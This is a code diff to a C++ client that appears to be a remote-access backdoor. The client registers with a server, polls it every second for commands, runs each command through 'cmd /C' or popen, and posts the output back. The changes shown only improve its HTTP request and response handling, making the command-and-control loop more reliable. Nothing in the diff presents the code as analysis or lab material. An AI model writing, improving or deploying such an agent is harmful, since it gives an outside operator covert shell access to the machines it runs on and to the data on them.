@@ -64,18 +64,40 @@ std::string send_request(const addrinfo* res, const std::string& req) {
         perror("send");
 #endif
     }
-
-    char buf[4096];
     std::string resp;
+    char buf[4096];
+    size_t content_length = 0;
+    bool got_headers = false;
+    size_t body_start = 0;
     int n;
     while ((n = recv(sock, buf, sizeof(buf), 0)) > 0) {
         resp.append(buf, buf + n);
+        if (!got_headers) {
+            size_t pos = resp.find("\r\n\r\n");
+            if (pos != std::string::npos) {
+                got_headers = true;
+                body_start = pos + 4;
+                size_t cl = resp.find("Content-Length:");
+                if (cl != std::string::npos) {
+                    cl += 15;
+                    while (cl < resp.size() && resp[cl] == ' ') cl++;
+                    size_t end = resp.find("\r\n", cl);
+                    if (end != std::string::npos) {
+                        content_length = std::stoul(resp.substr(cl, end - cl));
+                    }
+                }
+            }
+        }
+        if (got_headers && resp.size() - body_start >= content_length)
+            break;
     }
 #ifdef _WIN32
     closesocket(sock);
 #else
     close(sock);
 #endif
+    if (got_headers)
+        return resp.substr(body_start, content_length);
     return resp;
 }
 
@@ -108,6 +130,7 @@ int main(int argc, char* argv[]) {
     std::string body = "{\"client_id\":\"" + client_id + "\"}";
     std::string req = "POST /register HTTP/1.1\r\n";
     req += "Host: " + host + "\r\n";
+    req += "Connection: close\r\n";
     req += "Content-Type: application/json\r\n";
     req += "Content-Length: " + std::to_string(body.size()) + "\r\n";
     req += "\r\n";
@@ -116,7 +139,8 @@ int main(int argc, char* argv[]) {
 
     while (true) {
         std::string pollReq = "GET /poll?client_id=" + client_id + " HTTP/1.1\r\n";
-        pollReq += "Host: " + host + "\r\n\r\n";
+        pollReq += "Host: " + host + "\r\n";
+        pollReq += "Connection: close\r\n\r\n";
         std::string resp = send_request(res, pollReq);
         auto pos = resp.find("\r\n\r\n");
         std::string bodyResp = pos != std::string::npos ? resp.substr(pos + 4) : resp;
@@ -133,7 +157,6 @@ int main(int argc, char* argv[]) {
         if (!command.empty()) {
             std::cout << "Command: " << command << std::endl;
             std::string result;
-
 #ifdef _WIN32
             std::string fullCmd = "cmd /C " + command + " 2>&1";
             FILE* pipe = _popen(fullCmd.c_str(), "r");
@@ -142,13 +165,14 @@ int main(int argc, char* argv[]) {
             FILE* pipe = popen(fullCmd.c_str(), "r");
 #endif
             if (pipe) {
-                char buf[256];
+                char buf[1024];
                 while (fgets(buf, sizeof(buf), pipe)) {
                     result += buf;
                 }
 #ifdef _WIN32
                 _pclose(pipe);
 #else
+
                 pclose(pipe);
 #endif
             }
@@ -167,6 +191,7 @@ int main(int argc, char* argv[]) {
             std::string resBody = "{\"client_id\":\"" + client_id + "\",\"result\":\"" + esc + "\"}";
             std::string resReq = "POST /result HTTP/1.1\r\n";
             resReq += "Host: " + host + "\r\n";
+            resReq += "Connection: close\r\n";
             resReq += "Content-Type: application/json\r\n";
             resReq += "Content-Length: " + std::to_string(resBody.size()) + "\r\n\r\n";
             resReq += resBody;
@@ -177,7 +202,6 @@ int main(int argc, char* argv[]) {
 #ifdef _WIN32
         Sleep(1000);
 #else
-
         sleep(1);
 #endif
     }
